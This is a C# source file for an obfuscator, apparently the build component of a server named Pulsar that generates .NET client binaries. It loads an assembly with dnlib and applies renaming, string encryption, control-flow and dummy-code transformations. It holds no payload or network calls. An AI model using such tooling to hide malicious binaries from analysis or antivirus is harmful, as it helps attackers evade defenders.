using dnlib.DotNet;
using Pulsar.Server.Build.Obfuscator.Transformers;
using System;
using System.Collections.Generic;
using System.IO;

namespace Pulsar.Server.Build.Obfuscator
{
    public class Obfuscator
    {
        private ModuleContext moduleContext;
        private ModuleDefMD module;

        public Obfuscator(string path)
        {
            moduleContext = ModuleDef.CreateModuleContext();
            module = ModuleDefMD.Load(path, moduleContext);
        }

        public Obfuscator(byte[] data)
        {
            moduleContext = ModuleDef.CreateModuleContext();
            module = ModuleDefMD.Load(data, moduleContext);
        }

        public void Save(string path)
        {
            module.Write(path);
        }

        public byte[] Save()
        {
            MemoryStream stream = new MemoryStream();
            module.Write(stream);
            stream.Position = 0;
            byte[] data = new byte[stream.Length];
            stream.Read(data, 0, data.Length);
            return data;
        }

        public ModuleDefMD Module
        {
            get { return module; }
        }

        public void Obfuscate()
        {
            Console.WriteLine("Obfuscating....");

            List<ITransformer> transformers = new List<ITransformer>()
            {
                new RenamerTransformer(),
                new StringEncryptionTransformer(),
                new AdvancedStringEncryptionTransformer(),
                new ControlFlowTransformer(),
                new DummyCodeTransformer()
            };

            foreach (ITransformer transformer in transformers)
            {
                transformer.Transform(this);
            }
        }
    }
}
